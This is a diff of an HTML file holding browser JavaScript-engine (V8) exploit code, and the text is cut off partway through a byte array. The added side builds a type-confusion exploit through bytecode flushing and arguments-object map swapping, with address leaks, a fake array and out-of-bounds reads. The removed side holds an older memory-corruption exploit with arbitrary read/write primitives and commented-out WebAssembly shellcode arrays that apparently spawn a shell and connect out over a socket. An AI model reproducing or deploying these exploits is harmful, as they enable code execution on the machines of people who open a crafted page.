@@ -1,252 +1,221 @@
+<html>
+
+rcee
+
 <script>
-let empty_object = {};
-let empty_array = [];
-let corrupted_instance = null;
-let dogc_flag = false;
-let buffer = new ArrayBuffer(8);
-let f64 = new Float64Array(buffer);
-let u32 = new Uint32Array(buffer);
+// alert("ATTACH");
+console.log("----------------- ATTACH -----------------");
 
-function dogc() {
-        if(dogc_flag == true) {
-                for(let i = 0 ; i < 900; i++){
-                        new ArrayBuffer(0x10000);
-                        }
-                }
+// slot offset starts from 2
+let  o0, o1, o2, o3, o4, o5, o6, o7, o8, o9, o10, o11, o12, o13, o14, o15, o16, o17, o18, o19, o20, o21, o22, o23, o24, o25, o26, o27, o28, o29, o30, o31, o32, o33, o34, o35, o36, o37, o38, o39, o40, o41, o42, o43, o44, o45, o46, o47, o48, o49, o50, o51, o52, o53, o54, o55, o56, o57, o58, o59, o60, o61, o62, o63, o64, o65, o66, o67, o68, o69, o70, o71, o72, o73, o74, o75, o76, o77, o78, o79, o80, o81, o82, o83, o84, o85, o86, o87, o88, o89, o90, o91, o92, o93, o94, o95, o96, o97, o98, o99, o100, o101, o102, o103, o104, o105, o106, o107, o108, o109, o110, o111, o112, o113, o114, o115, o116, o117, o118, o119, o120, o121, o122, o123, o124, o125, o126, o127, o128, o129, o130, o131, o132, o133, o134, o135, o136, o137, o138, o139, o140, o141, o142, o143, o144, o145, o146, o147, o148, o149, o150, o151, o152, o153, o154, o155, o156, o157, o158, o159, o160, o161, o162, o163, o164, o165, o166, o167, o168, o169, o170, o171, o172, o173, o174, o175, o176, o177, o178, o179, o180, o181, o182, o183, o184, o185, o186, o187, o188, o189, o190, o191, o192, o193, o194, o195, o196, o197, o198, o199, o200, o201, o202, o203, o204, o205, o206, o207, o208, o209, o210, o211, o212, o213, o214, o215, o216, o217, o218, o219, o220, o221, o222, o223, o224, o225, o226, o227, o228, o229, o230, o231, o232, o233, o234, o235, o236, o237, o238, o239, o240, o241, o242, o243, o244, o245, o246, o247, o248, o249, o250, o251, o252, o253, o254, o255, o256, o257, o258, o259, o260, o261, o262, o263, o264, o265, o266, o267, o268, o269, o270, o271, o272, o273, o274, o275, o276, o277, o278, o279, o280;
+
+function gc_minor() { // scavenge
+  for (let i = 0; i < 1000; i++) {
+    new ArrayBuffer(0x10000);
+  }
+}
+
+function gc_major() { // mark-sweep
+  try {
+    // doesn't seem to matter if the allocation fails
+    new ArrayBuffer(0x7fe00000);
+  } catch (err) {
+    // print(err);
+  }
+}
+
+// https://source.chromium.org/chromium/_/chromium/v8/v8.git/+/18865d6af0404f2d2aeb1c99dd73503364ce0967:src/flags/flag-definitions.h;l=1444
+function flush_bytecode() {
+  // please change to be the "bytecode_old_age" value from ./src/flags/flag-definitions.h
+  // you can observe if this is working by passing the "--trace-gc" flag
+  const bytecode_old_age = 100;
+  for (let i = 0; i < bytecode_old_age; i++) {
+    gc_major();
+  }
+}
+
+
+let arr_buf = new ArrayBuffer(8);
+let f64_arr = new Float64Array(arr_buf);
+let b64_arr = new BigInt64Array(arr_buf);
+
+function ftoi(f) {
+  f64_arr[0] = f;
+  return b64_arr[0];
+}
+
+function itof(i) {
+  b64_arr[0] = i;
+  return f64_arr[0];
+}
+
+
+
+
+function f1() {
+  function hax() {
+    // o60 is JS_ARGUMENTS_OBJECT_TYPE map with FAST_SLOPPY_ARGUMENTS_ELEMENTS
+    // o196 is JS_ARGUMENTS_OBJECT_TYPE map with PACKED_ELEMENTS
+    // o110 is JS_ARRAY_TYPE map with PACKED_DOUBLE_ELEMENTS
+    o60 = o110;
+  }
+
+  (arg = class AAA {
+    static {
+      this;
+    }
+  }) => { }
+
+  hax();
+  return hax;
+}
+
+let hax = f1();
+
+flush_bytecode();
+console.log('after flush');
+
+f1();
+
+function hax2(a0) {
+  return [ftoi(arguments[0]), ftoi(arguments[1]), ftoi(arguments[2])];
+}
+
+gc_major()
+
+let arr = [1.1];
+console.log("arr");
+console.log(arr);
+let leak = hax2(arr, 1, 1);
+let [arr_addr, packed_double_map, fixed_arr_addr] = [leak[0] & 0xFFFFFFFFn, leak[1] >> 32n, leak[2] >> 32n];
+console.log('arr addr: ' + arr_addr.toString(16));
+console.log('packed_double_map addr: ' + packed_double_map.toString(16));
+console.log('fixed_arr_addr addr: ' + fixed_arr_addr.toString(16));
+
+function f2() {
+  function hax4() {
+    // o60 is JS_ARGUMENTS_OBJECT_TYPE map with FAST_SLOPPY_ARGUMENTS_ELEMENTS
+    // o196 is JS_ARGUMENTS_OBJECT_TYPE map with PACKED_ELEMENTS
+    // o110 is JS_ARRAY_TYPE map with PACKED_DOUBLE_ELEMENTS
+    // o113 is HOLEY_ELEMENTS
+    // o111 HOLEY_DOUBLE_ELEMENTS
+    o60 = o110; 
+    o196 = o110;
+  }
+
+  (arg = class AAA {
+    static {
+      this;
+    }
+  }) => { }
+
+  hax4();
+  return hax4;
+}
+
+let hax4 = f2();
+
+flush_bytecode();
+console.log('after flush');
+
+f2();
+
+function hax3(a0) {
+    // console.log(o0);
+    // console.log(o1);
+    // console.log(o2);
+    console.log("hax3 fn");
+    // %DebugPrint(arguments);    
+    
+    console.log("arguments[0]");
+
+    
+    arguments[3] = 1.1; // overwrite length of the arguments array itself
+ 
+    console.log("After write");
+    // %SystemBreak();
+    // var obj = arguments[5];
+    // console.log(obj);
+    let dd_floats = [1.1, 1.2, 1.3, 1.4];
+    let dd_obj = [2.1, dd_floats, dd_floats];
+    return [arguments, dd_floats, dd_obj];
+}
+
+// create a fake array
+let smuggle_arr = [1.1, 1.2, itof(packed_double_map + (0x219n << 32n)), itof(arr_addr + (0x100n << 32n))];
+console.log("smuggle_arr:");
+console.log(smuggle_arr);
+let leak2 = hax2(smuggle_arr, 1, 1);
+let [smuggle_arr_addr, packed_double_map2, fixed_arr_addr2] = [leak2[0] & 0xFFFFFFFFn, leak2[1] >> 32n, leak2[2] >> 32n];
+console.log('smuggle_arr_addr: ' + smuggle_arr_addr.toString(16));
+
+let actual_smuggle_arr_addr = smuggle_arr_addr - (0xCDn - 0x65n);
+let fake_dbl_arr_in_smuggle = actual_smuggle_arr_addr-0x20n+0x10n;
+console.log("compensated smuggle_arr_addr: 0x" +actual_smuggle_arr_addr.toString(16));
+console.log("fake_dbl_arr_in_smuggle: 0x" +fake_dbl_arr_in_smuggle.toString(16));
+
+
+let arr2 = [1.1];
+console.log("Before hax3");
+let test = {};
+console.log("TRY LEAK TEST:");
+console.log(test);
+[leaker_pls, dd_floats, dd_obj] = hax3(test, 1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8);
+console.log(leaker_pls);
+console.log(dd_floats);
+console.log(dd_obj);
+
+
+var idx = 0;
+var found = 0;
+for (idx = 0; idx < 0x4000; idx++){
+    console.log((ftoi(leaker_pls[idx])).toString(16))
+    if (leaker_pls[idx] == itof(0x3ff3333333333333n)){
+        if (leaker_pls[idx+1] == itof(0x3ff4cccccccccccdn)){
+            console.log(`Found dd_float at idx ${idx}`)
+            found = 1;
+            break;
         }
-
-class ClassParent {}
-class ClassBug extends ClassParent {
-        constructor(a20, a21, a22) {
-                const v24 = new new.target();
-                let x = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];
-                super();
-                let a = [1.1];
-                this.x = x;
-                this.a = a;
-                JSON.stringify(empty_array);
-        }
-        [1] = dogc();
+    }
 }
 
-for (let i = 0; i<200; i++) {
-        dogc_flag = false;
-        if (i%2 == 0) dogc_flag = true;
-        dogc();
+if (found == 0){
+    document.write("<br>")
+    document.write("No found dd_float")
+    throw "Bye"
+}
+else{
+    document.write("<br>")
+    document.write("found dd_float")
 }
 
-for (let i = 0; i < 650; i++) {
-        dogc_flag=false;
-        if (i == 644 || i == 645 || i == 646 || i ==640) {
-                dogc_flag=true;
-                dogc();
-                dogc_flag=false;
-        }
-        if (i == 646) dogc_flag=true;
-        let x = Reflect.construct(ClassBug, empty_array, ClassParent);
-        if (i == 646) {
-                corrupted_instance = x;
-        }
+leaker_pls[idx] = itof(0x4141414141414141n);
+if (dd_floats[1] == itof(0x4141414141414141n)){
+    console.log("Woohoo");
 }
 
-let x = corrupted_instance.x;
-let a = corrupted_instance.a;
-
-let rwarr = [1.1, 2.2, 2.2];
-dogc_flag = true;
-dogc();
-
-//------------------addrof primitive-----------------
-function addrof_tmp(obj) {
-        x[0] = obj;
-        f64[0] = a[0];
-        return u32[0];
+dd_floats_idx = idx;
+dd_element_idx = dd_floats_idx + 4;
+function addrof(obj){
+    dd_obj[0] = obj;
+    dd_obj[1] = obj;
+    var leak = ftoi(leaker_pls[dd_floats_idx + 12]);
+    leak = leak & 0xFFFFFFFFn;
+    console.log(`addrof: 0x${leak.toString(16)}`)
+    return leak;
 }
 
-let addr_a = addrof_tmp(a);
-let addr_rwarr = addrof_tmp(rwarr);
-//---------------------------------------------------
-
-//-------------------change length of a array------------
-x[5] = 0x10000;
-if (a.length != 0x10000) {
-        console.error("Initial Corruption Failed!");
-}
-//-------------------------------------------------
-
-//-----------------write primitive------------------
-//code for considering only the case : addr_rwarr > addr_a
-if (addr_rwarr < addr_a) {
-        console.error("Failed");
-}
-
-//calc offset
-let offset = (addr_rwarr - addr_a) + 0xc;
-if ( (offset % 8) != 0 ) {
-        offset += 4;
-}
-
-offset = offset / 8;
-offset += 1; //our a array has one of 1.1
-offset -= 1;
-let marker42_idx = offset;
-
-//declare and assign
-let b64 = new BigUint64Array(buffer);
-let zero = 0n;
-
-//write primitive
-function v8h_write64(where, what) {
-        b64[0] = zero;
-        f64[0] = a[marker42_idx];
-        if (u32[1] == 0x6) {
-                u32[0] = where-8;
-                a[marker42_idx] = f64[0];
-        }
-        else {
-                u32[1] = where-8;
-                a[marker42_idx] = f64[0];
-        }
-        rwarr[0] = what;
-}
-//-------------------------------------------------
-
-//-------------Achieving GC resistance-------------
-//create 3 objects
-let changer = [1.1,2.2,3.3,4.4,5.5,6.6]
-let leaker  = [1.1,2.2,3.3,4.4,5.5,6.6]
-let holder  = {p1: 0x1234, p2: 0x1234, p3: 0x1234};
-
-//get addr of objects
-let changer_addr = addrof_tmp(changer);
-let leaker_addr = addrof_tmp(leaker);
-let holder_addr = addrof_tmp(holder);
-
-//corrupt that objects
-u32[0] = holder_addr;
-u32[1] = 0xc;
-let original_leaker_bytes = f64[0];
-
-u32[0] = leaker_addr;
-u32[1] = 0xc;
-
-v8h_write64(changer_addr+0x8, f64[0]);
-v8h_write64(leaker_addr+0x8, original_leaker_bytes);
-
-//fix the corruption to the objects in Old Space
-x.length = 0;
-a.length = 0;
-rwarr.length = 0;
-//------------------------------------------------
-
-//----------------final read/write primitives-------
-function f2i(f) {
-        f64[0] = f;
-        return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
-}
-
-function v8h_read64(addr) {
-        original_leaker_bytes = changer[0];
-        u32[0] = Number(addr)-8;
-        u32[1] = 0xc;
-        changer[0] = f64[0];
-
-        let ret = leaker[0];
-        changer[0] = original_leaker_bytes;
-        return f2i(ret);
-}
-
-function v8h_write(addr, value) {
-        original_leaker_bytes = changer[0];
-        u32[0] = Number(addr)-8;
-        u32[1] = 0xc;
-        changer[0] = f64[0];
-
-        f64[0] = leaker[0];
-        u32[0] = Number(value);
-        leaker[0] = f64[0];
-        changer[0] = original_leaker_bytes;
-}
-//-------------------------------------------------
-
-//-----------------final addrof primitive----------
-function addrof(obj) {
-        holder.p2 = obj;
-        let ret = leaker[1];
-        holder.p2 = 0;
-        return f2i(ret) & 0xffffffffn;
-}
-//-------------------------------------------------
-
-//--------------Program Counter Control-----------------
-let buffer_2 = new ArrayBuffer(8);
-let f64_2 = new Float64Array(buffer_2);
-let u32_2 = new Uint32Array(buffer_2);
-let b64_2 = new BigUint64Array(buffer_2);
-
-function wasm_write(addr, value) {
-        original_leaker_bytes = changer[0];
-        u32_2[0] = Number(addr)-8;
-        u32_2[1] = 0xc;
-        changer[0] = f64_2[0];
-
-        b64_2[0] = value;
-        leaker[0] = f64_2[0];
-        changer[0] = original_leaker_bytes;
-}
-
-// let shell_wasm_code = new Uint8Array([
-//     0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 17, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 133, 1, 1, 130, 1, 0, 65, 0, 68, 0, 0, 0, 0, 0, 0, 0, 0, 57, 3, 0, 65, 0, 68, 106, 59, 88, 144, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 104, 47, 115, 104, 0, 91, 235, 11, 57, 3, 0, 65, 0, 68, 104, 47, 98, 105, 110, 89, 235, 11, 57, 3, 0, 65, 0, 68, 72, 193, 227, 32, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 1, 203, 83, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 137, 231, 144, 144, 144, 235, 11, 57, 3, 0, 65, 0, 68, 72, 49, 246, 72, 49, 210, 235, 11, 57, 3, 0, 65, 0, 68, 15, 5, 144, 144, 144, 144, 235, 11, 57, 3, 0, 65, 42, 11
-//   ]);
-
-// let shell_wasm_code = new Uint8Array([ 0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 134, 1, 1, 131, 1, 0, 68, 72, 49, 192, 235, 15, 167, 167, 167, 68, 72, 49, 255, 235, 15, 191, 191, 191, 68, 72, 49, 246, 235, 15, 216, 216, 216, 68, 72, 49, 210, 235, 15, 242, 242, 242, 68, 77, 49, 192, 235, 15, 13, 13, 13, 68, 106, 2, 235, 16, 41, 41, 41, 41, 68, 95, 235, 17, 70, 70, 70, 70, 70, 68, 106, 1, 235, 16, 100, 100, 100, 100, 68, 94, 235, 17, 131, 131, 131, 131, 131, 68, 106, 6, 235, 16, 163, 163, 163, 163, 68, 90, 235, 17, 196, 196, 196, 196, 196, 68, 106, 41, 235, 16, 230, 230, 230, 230, 68, 88, 15, 5, 235, 15, 9, 9, 9, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 11, ]);
-
-// let shell_wasm_code = new Uint8Array([ 0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 214, 1, 1, 211, 1, 0, 68, 56, 121, 128, 173, 65, 17, 167, 167, 68, 176, 50, 254, 212, 34, 149, 183, 165, 68, 119, 32, 71, 132, 16, 188, 180, 163, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 120, 130, 187, 241, 110, 247, 17, 147, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 36, 85, 135, 82, 137, 125, 138, 161, 68, 237, 179, 221, 111, 184, 37, 16, 149, 68, 72, 49, 192, 235, 15, 167, 167, 167, 68, 72, 49, 255, 235, 15, 191, 191, 191, 68, 72, 49, 246, 235, 15, 216, 216, 216, 68, 72, 49, 210, 235, 15, 242, 242, 242, 68, 77, 49, 192, 235, 15, 13, 13, 13, 68, 106, 2, 235, 16, 41, 41, 41, 41, 68, 95, 235, 17, 70, 70, 70, 70, 70, 68, 106, 1, 235, 16, 100, 100, 100, 100, 68, 94, 235, 17, 131, 131, 131, 131, 131, 68, 106, 6, 235, 16, 163, 163, 163, 163, 68, 90, 235, 17, 196, 196, 196, 196, 196, 68, 106, 41, 235, 16, 230, 230, 230, 230, 68, 88, 15, 5, 235, 15, 9, 9, 9, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 11, ]);
-
-// let shell_wasm_code = new Uint8Array([ 0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 214, 1, 1, 211, 1, 0, 68, 56, 121, 128, 173, 65, 17, 167, 167, 68, 176, 50, 254, 212, 34, 149, 183, 165, 68, 119, 32, 71, 132, 16, 188, 180, 163, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 120, 130, 187, 241, 110, 247, 17, 147, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 36, 85, 135, 82, 137, 125, 138, 161, 68, 237, 179, 221, 111, 184, 37, 16, 149, 68, 72, 49, 192, 235, 15, 167, 167, 167, 68, 72, 49, 255, 235, 15, 191, 191, 191, 68, 72, 49, 246, 235, 15, 216, 216, 216, 68, 72, 49, 210, 235, 15, 242, 242, 242, 68, 77, 49, 192, 235, 15, 13, 13, 13, 68, 106, 2, 235, 16, 41, 41, 41, 41, 68, 95, 235, 17, 70, 70, 70, 70, 70, 68, 106, 1, 235, 16, 100, 100, 100, 100, 68, 94, 235, 17, 131, 131, 131, 131, 131, 68, 106, 6, 235, 16, 163, 163, 163, 163, 68, 90, 106, 41, 235, 15, 196, 196, 196, 68, 76, 137, 225, 235, 15, 230, 230, 230, 68, 88, 15, 5, 235, 15, 9, 9, 9, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 11, ]);
-
-// let shell_wasm_code = new Uint8Array([ 0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 158, 3, 1, 155, 3, 0, 68, 56, 121, 128, 173, 65, 17, 167, 167, 68, 176, 50, 254, 212, 34, 149, 183, 165, 68, 119, 32, 71, 132, 16, 188, 180, 163, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 120, 130, 187, 241, 110, 247, 17, 147, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 36, 85, 135, 82, 137, 125, 138, 161, 68, 237, 179, 221, 111, 184, 37, 16, 149, 68, 72, 49, 192, 235, 15, 167, 167, 167, 68, 72, 49, 255, 235, 15, 191, 191, 191, 68, 72, 49, 246, 235, 15, 216, 216, 216, 68, 72, 49, 210, 235, 15, 242, 242, 242, 68, 77, 49, 192, 235, 15, 13, 13, 13, 68, 106, 2, 235, 16, 41, 41, 41, 41, 68, 95, 235, 17, 70, 70, 70, 70, 70, 68, 106, 1, 235, 16, 100, 100, 100, 100, 68, 94, 235, 17, 131, 131, 131, 131, 131, 68, 106, 6, 235, 16, 163, 163, 163, 163, 68, 90, 106, 41, 235, 15, 196, 196, 196, 68, 76, 137, 225, 235, 15, 230, 230, 230, 68, 88, 15, 5, 235, 15, 9, 9, 9, 68, 73, 137, 192, 235, 15, 45, 45, 45, 68, 72, 49, 246, 235, 15, 82, 82, 82, 68, 77, 49, 210, 235, 18, 120, 120, 120, 68, 65, 82, 235, 19, 159, 159, 159, 159, 68, 198, 4, 36, 2, 235, 17, 199, 199, 68, 198, 68, 36, 1, 0, 235, 16, 240, 68, 198, 68, 36, 2, 1, 235, 16, 26, 68, 198, 68, 36, 3, 187, 235, 16, 69, 68, 198, 68, 36, 4, 127, 235, 16, 113, 68, 198, 68, 36, 5, 0, 235, 16, 158, 68, 198, 68, 36, 6, 0, 235, 16, 204, 68, 198, 68, 36, 7, 1, 235, 16, 251, 68, 72, 137, 230, 235, 18, 43, 43, 43, 68, 106, 16, 235, 19, 92, 92, 92, 92, 68, 90, 235, 20, 142, 142, 142, 142, 142, 68, 65, 80, 235, 19, 193, 193, 193, 193, 68, 95, 235, 20, 245, 245, 245, 245, 245, 68, 106, 42, 235, 19, 42, 42, 42, 42, 68, 88, 235, 20, 96, 96, 96, 96, 96, 68, 15, 5, 235, 19, 151, 151, 151, 151, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 11, ]);
-
-// let shell_wasm_code = new Uint8Array([ 0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 238, 3, 1, 235, 3, 0, 68, 56, 121, 128, 173, 65, 17, 167, 167, 68, 176, 50, 254, 212, 34, 149, 183, 165, 68, 119, 32, 71, 132, 16, 188, 180, 163, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 120, 130, 187, 241, 110, 247, 17, 147, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 36, 85, 135, 82, 137, 125, 138, 161, 68, 237, 179, 221, 111, 184, 37, 16, 149, 68, 72, 49, 192, 235, 15, 167, 167, 167, 68, 72, 49, 255, 235, 15, 191, 191, 191, 68, 72, 49, 246, 235, 15, 216, 216, 216, 68, 72, 49, 210, 235, 15, 242, 242, 242, 68, 77, 49, 192, 235, 15, 13, 13, 13, 68, 106, 2, 235, 16, 41, 41, 41, 41, 68, 95, 235, 17, 70, 70, 70, 70, 70, 68, 106, 1, 235, 16, 100, 100, 100, 100, 68, 94, 235, 17, 131, 131, 131, 131, 131, 68, 106, 6, 235, 16, 163, 163, 163, 163, 68, 90, 106, 41, 235, 15, 196, 196, 196, 68, 76, 137, 225, 235, 15, 230, 230, 230, 68, 88, 15, 5, 235, 15, 9, 9, 9, 68, 73, 137, 192, 235, 15, 45, 45, 45, 68, 72, 49, 246, 235, 15, 82, 82, 82, 68, 77, 49, 210, 235, 18, 120, 120, 120, 68, 65, 82, 235, 19, 159, 159, 159, 159, 68, 198, 4, 36, 2, 235, 17, 199, 199, 68, 198, 68, 36, 1, 0, 235, 16, 240, 68, 198, 68, 36, 2, 1, 235, 16, 26, 68, 198, 68, 36, 3, 187, 235, 16, 69, 68, 198, 68, 36, 4, 127, 235, 16, 113, 68, 198, 68, 36, 5, 0, 235, 16, 158, 68, 198, 68, 36, 6, 0, 235, 16, 204, 68, 198, 68, 36, 7, 1, 235, 16, 251, 68, 72, 137, 230, 235, 18, 43, 43, 43, 68, 106, 16, 235, 19, 92, 92, 92, 92, 68, 90, 235, 20, 142, 142, 142, 142, 142, 68, 65, 80, 235, 19, 193, 193, 193, 193, 68, 95, 235, 20, 245, 245, 245, 245, 245, 68, 106, 42, 235, 19, 42, 42, 42, 42, 68, 88, 235, 20, 96, 96, 96, 96, 96, 68, 15, 5, 235, 19, 151, 151, 151, 151, 68, 72, 49, 246, 235, 18, 207, 207, 207, 68, 106, 3, 235, 19, 8, 8, 8, 8, 68, 94, 235, 20, 66, 66, 66, 66, 66, 68, 72, 255, 206, 235, 18, 125, 125, 125, 68, 106, 33, 235, 19, 185, 185, 185, 185, 68, 88, 235, 20, 246, 246, 246, 246, 246, 68, 15, 5, 235, 19, 52, 52, 52, 52, 68, 117, 159, 144, 144, 144, 144, 144, 144, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 11, ]);
-
-// let shell_wasm_code = new Uint8Array([ 0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 238, 3, 1, 235, 3, 0, 68, 56, 121, 128, 173, 65, 17, 167, 167, 68, 176, 50, 254, 212, 34, 149, 183, 165, 68, 119, 32, 71, 132, 16, 188, 180, 163, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 120, 130, 187, 241, 110, 247, 17, 147, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 36, 85, 135, 82, 137, 125, 138, 161, 68, 237, 179, 221, 111, 184, 37, 16, 149, 68, 72, 49, 192, 235, 15, 167, 167, 167, 68, 72, 49, 255, 235, 15, 191, 191, 191, 68, 72, 49, 246, 235, 15, 216, 216, 216, 68, 72, 49, 210, 235, 15, 242, 242, 242, 68, 77, 49, 192, 235, 15, 13, 13, 13, 68, 106, 2, 235, 16, 41, 41, 41, 41, 68, 95, 235, 17, 70, 70, 70, 70, 70, 68, 106, 1, 235, 16, 100, 100, 100, 100, 68, 94, 235, 17, 131, 131, 131, 131, 131, 68, 106, 6, 235, 16, 163, 163, 163, 163, 68, 90, 106, 41, 235, 15, 196, 196, 196, 68, 76, 137, 225, 235, 15, 230, 230, 230, 68, 88, 15, 5, 235, 15, 9, 9, 9, 68, 73, 137, 192, 235, 15, 45, 45, 45, 68, 72, 49, 246, 235, 15, 82, 82, 82, 68, 77, 49, 210, 235, 18, 120, 120, 120, 68, 65, 82, 235, 19, 159, 159, 159, 159, 68, 198, 4, 36, 2, 235, 17, 199, 199, 68, 198, 68, 36, 1, 0, 235, 16, 240, 68, 198, 68, 36, 2, 1, 235, 16, 26, 68, 198, 68, 36, 3, 187, 235, 16, 69, 68, 198, 68, 36, 4, 127, 235, 16, 113, 68, 198, 68, 36, 5, 0, 235, 16, 158, 68, 198, 68, 36, 6, 0, 235, 16, 204, 68, 198, 68, 36, 7, 1, 235, 16, 251, 68, 72, 137, 230, 235, 18, 43, 43, 43, 68, 106, 16, 235, 19, 92, 92, 92, 92, 68, 90, 235, 20, 142, 142, 142, 142, 142, 68, 65, 80, 235, 19, 193, 193, 193, 193, 68, 95, 235, 20, 245, 245, 245, 245, 245, 68, 106, 42, 235, 19, 42, 42, 42, 42, 68, 88, 235, 20, 96, 96, 96, 96, 96, 68, 15, 5, 235, 19, 151, 151, 151, 151, 68, 72, 49, 246, 235, 18, 207, 207, 207, 68, 106, 3, 235, 19, 8, 8, 8, 8, 68, 94, 235, 20, 66, 66, 66, 66, 66, 68, 72, 255, 206, 235, 18, 125, 125, 125, 68, 106, 33, 235, 19, 185, 185, 185, 185, 68, 88, 235, 20, 246, 246, 246, 246, 246, 68, 15, 5, 235, 19, 52, 52, 52, 52, 68, 117, 162, 144, 144, 144, 144, 144, 144, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 11, ]);
-
-// let shell_wasm_code = new Uint8Array([ 0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 142, 5, 1, 139, 5, 0, 68, 56, 121, 128, 173, 65, 17, 167, 167, 68, 176, 50, 254, 212, 34, 149, 183, 165, 68, 119, 32, 71, 132, 16, 188, 180, 163, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 120, 130, 187, 241, 110, 247, 17, 147, 68, 0, 0, 0, 0, 0, 0, 0, 128, 68, 36, 85, 135, 82, 137, 125, 138, 161, 68, 237, 179, 221, 111, 184, 37, 16, 149, 68, 72, 49, 192, 235, 15, 167, 167, 167, 68, 72, 49, 255, 235, 15, 191, 191, 191, 68, 72, 49, 246, 235, 15, 216, 216, 216, 68, 72, 49, 210, 235, 15, 242, 242, 242, 68, 77, 49, 192, 235, 15, 13, 13, 13, 68, 106, 2, 235, 16, 41, 41, 41, 41, 68, 95, 235, 17, 70, 70, 70, 70, 70, 68, 106, 1, 235, 16, 100, 100, 100, 100, 68, 94, 235, 17, 131, 131, 131, 131, 131, 68, 106, 6, 235, 16, 163, 163, 163, 163, 68, 90, 106, 41, 235, 15, 196, 196, 196, 68, 76, 137, 225, 235, 15, 230, 230, 230, 68, 88, 15, 5, 235, 15, 9, 9, 9, 68, 73, 137, 192, 235, 15, 45, 45, 45, 68, 72, 49, 246, 235, 15, 82, 82, 82, 68, 77, 49, 210, 235, 18, 120, 120, 120, 68, 65, 82, 235, 19, 159, 159, 159, 159, 68, 198, 4, 36, 2, 235, 17, 199, 199, 68, 198, 68, 36, 1, 0, 235, 16, 240, 68, 198, 68, 36, 2, 1, 235, 16, 26, 68, 198, 68, 36, 3, 187, 235, 16, 69, 68, 198, 68, 36, 4, 127, 235, 16, 113, 68, 198, 68, 36, 5, 0, 235, 16, 158, 68, 198, 68, 36, 6, 0, 235, 16, 204, 68, 198, 68, 36, 7, 1, 235, 16, 251, 68, 72, 137, 230, 235, 18, 43, 43, 43, 68, 106, 16, 235, 19, 92, 92, 92, 92, 68, 90, 235, 20, 142, 142, 142, 142, 142, 68, 65, 80, 235, 19, 193, 193, 193, 193, 68, 95, 235, 20, 245, 245, 245, 245, 245, 68, 106, 42, 235, 19, 42, 42, 42, 42, 68, 88, 235, 20, 96, 96, 96, 96, 96, 68, 15, 5, 235, 19, 151, 151, 151, 151, 68, 72, 49, 246, 235, 18, 207, 207, 207, 68, 106, 3, 235, 19, 8, 8, 8, 8, 68, 94, 235, 20, 66, 66, 66, 66, 66, 68, 72, 255, 206, 235, 18, 125, 125, 125, 68, 106, 33, 235, 19, 185, 185, 185, 185, 68, 88, 235, 20, 246, 246, 246, 246, 246, 68, 15, 5, 235, 19, 52, 52, 52, 52, 68, 117, 162, 144, 144, 144, 144, 144, 144, 68, 72, 49, 255, 235, 18, 115, 115, 115, 68, 87, 235, 20, 179, 179, 179, 179, 179, 68, 87, 235, 20, 244, 244, 244, 244, 244, 68, 94, 235, 20, 54, 54, 54, 54, 54, 68, 90, 235, 20, 121, 121, 121, 121, 121, 68, 198, 7, 47, 235, 18, 189, 189, 189, 68, 198, 71, 1, 98, 235, 17, 2, 2, 68, 198, 71, 2, 105, 235, 17, 72, 72, 68, 198, 71, 3, 110, 235, 17, 143, 143, 68, 198, 71, 4, 47, 235, 